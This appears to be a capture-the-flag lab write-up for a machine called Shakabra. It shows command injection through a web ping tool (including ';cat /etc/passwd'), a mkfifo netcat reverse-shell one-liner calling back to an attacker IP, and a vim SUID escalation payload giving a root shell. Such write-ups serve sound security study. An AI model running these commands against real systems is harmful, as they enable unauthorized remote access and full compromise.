# {{Shakabra}}


# Resolution summary
- Found a connection tester tool running on port 80
- Added a semi colon and modified mkfifo netcat one liner; setup a netcat listener and recieved a reverse shell
- Found SUID /usr/bin/vim.basic binary on the target machine
- Found the SUID binary on GTFO bins 
- Followed the steps to escalate privileges and received a root shell

## Improved skills
- Found adding a semi colon after a command will be treated a separate command the commands will be executed sequentially 

## Used tools
- nmap
- rustscan

# Enumeration
## Port 80 - Apache httpd 2.4.29

#### As port 80 was found to be open per nmap scan; I navigated to the boxes IP address and found the below webpage:

#ConnectionTesterTool
#### As "127.0.0.1 was already populated in the "ping" bar I input "127.0.0.1" into it and clicked go and found the below ping results: 

![](Pasted%20image%2020221018181341.png)

#### I then typed ";cat /etc/passwd" (adding a semicolon at the end of 127.0.0.1) and found the below user "dylan" on the system:

#Command_Injection 

#### Then typed "; which nc" and found the machine had nc installed:

# Exploitation
## Name of the technique
## Command injection from connection tester tool

#### I attempted to type the usual netcat one liner reverse shell syntax but didn't work. I then tried "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [kali IP] [Listener Port] >/tmp/f" found in "pentestmonkey.net" but had to modify it to the following in order to get it to work: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.53.200 80 >/tmp/f" (the modification I added was the "-f" after command "rm") 
#mkfifoNetcatReverseShell

#### Ran the syntax above on the connection tester tool and had a listener listening on my kali machine and received a reverse shell

# Privilege Escalation
## Local Enumeration

#### Typed "find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null" to find SUID binaries and found the following "vim.basic" set as SUID bit: 
![](Pasted%20image%2020221018183948.png)


## Privilege Escalation vector
## VIM SUID Binary

#### Found "vim" in GTFOBins site and followed the instructions to run the binary and type colon to enter "enter command mode" and prepend py3 to the command as the machine only has python3 and typed ":py3 import os; os.exec("/bin/sh", "sh", "-pc", "reset; exec sh -p")" and then enter and then when asked "which terminal?" Enter "xterm" and then received a root shell:
